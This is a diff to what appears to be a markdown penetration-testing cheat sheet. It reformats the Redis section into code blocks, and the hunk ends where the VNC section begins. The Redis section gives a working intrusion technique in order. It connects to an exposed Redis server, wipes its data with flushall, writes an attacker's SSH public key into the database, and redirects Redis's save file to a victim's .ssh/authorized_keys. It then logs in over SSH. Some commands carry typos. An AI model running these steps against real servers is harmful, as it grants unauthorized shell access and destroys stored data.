@@ -672,36 +672,66 @@ Data structure store, used as a database, cache and message broker. It supports 
 #### nmap
 
 #### telnet
-- telnet <victim_ip> <redis_port_usually_6379>
+```
+telnet <victim_ip> <redis_port_usually_6379>
+```
+
+#### nc
+```
+nc <victim_ip> <redis_port_usually_6379>
+```
 
 #### Generate SSH key
-- ssh-keygen -t rsa -C <youremail>@<email_domain>
+```
+ssh-keygen -t rsa b 4096 -C <youremail>@<email_domain>
+```
 
 ### Add random data before and after our key:
+```
 - (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt
+```
 
 ### Connect to redis 
-- redis-cli -h <victim_ip>
+```
+apt-get install redis-tools
+redis-cli -h <victim_ip>
+````
 
-### Flush keys
-- redis-cli -h <victim_ip> -p 6379 flushall
+### Flush keys\
+```
+redis-cli -h <victim_ip> -p 6379 flushall
+```
 
 ### Set our keys into the database
-- cat key.txt | redis-cli -h <victim_ip> -p 6379 -x set bb
+```
+cat key.txt | redis-cli -h <victim_ip> -p 6379 -x set bb
+```
 
 ### Check the current folder 
-- config get dir
+```
+>config get dir
+```
 
 ### Change out directory
-- config set dir /<victim_user_name>/.ssh/
+```
+> config set dir /<victim_user_name>/.ssh/
+for examople: config set dir /var/lib/redis/.ssh/
+```
 
 ### Change name of our file
-- set dbfilename "authorized_keys"
+```
+> set dbfilename "authorized_keys"
+```
 
 ### Save changes
-- save
-
+```
+> save
+```
 ### Try to login into server via SSH
+```
+chmod 600 id_rsa
+ssh -i id_rsa redis@<victim_ip>
+```
 -------------------------------------------------------------------------------------------------------------------------------------
 # VNC
 Gaphical desktop sharing system that uses the Remote Frame Buffer protocol (RFB) to remotely control another computer. It transmits the keyboard and mouse events from one computer to another. 
